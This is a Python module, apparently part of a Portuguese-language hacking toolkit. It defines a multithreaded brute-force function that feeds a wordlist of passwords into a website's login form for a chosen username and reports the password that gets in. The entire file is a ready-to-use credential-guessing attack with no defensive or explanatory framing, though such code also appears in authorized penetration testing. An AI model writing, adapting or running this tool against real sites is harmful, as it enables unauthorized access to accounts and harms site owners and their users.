import requests
from tqdm import tqdm
from utils import puxar_wordlist
import threading
from concurrent.futures import ThreadPoolExecutor


def brute_http_form(url_login, usuario, wordlist_path, 
                    campo_usuario="username", 
                    campo_senha="password", 
                    dados_extras=None, 
                    sucesso_text=None):
    wordlist = puxar_wordlist(wordlist_path)
    dados_extras = dados_extras or {}
    event = threading.Event()
    
    def worker(password):
        if event.is_set():
            return None
    
        payload = {
            campo_usuario: usuario,
            campo_senha: password,
            **dados_extras
            }
        try:
            session = requests.Session()
            r = session.post(url_login, data=payload, timeout=8)
            
            if r.status_code == 200:
                if sucesso_text and sucesso_text in r.text:
                    print(f"LOGIN HTTP CONSEGUIDO! senha: {password}")
                    event.set()
                    return password
            elif "logout" in r.text.lower() or r.url != url_login:
                print(f"LOGIN HTTP CONSEGUIDO! senha: {password}")
                return password
     
        except requests.RequestException:
            pass
        
        return None
        
    
    resultado = None
        
    with ThreadPoolExecutor(max_workers=10) as executor:
        for result in tqdm(executor.map(worker, wordlist), 
                            total=len(wordlist),
                            desc="HTTP Brute Force: ",      
                            ascii=True):
            
            if result:
                resultado = result
                break
            
        if resultado:
            print(f"[+] USUÁRIO ENCONTRADO: {usuario}")
            print(f"[+] SENHA ENCONTRADA: {resultado}")
        else:
            print("[*] FORMULÁRIO HTTP NÃO CONSEGUIU!")
        
        return resultado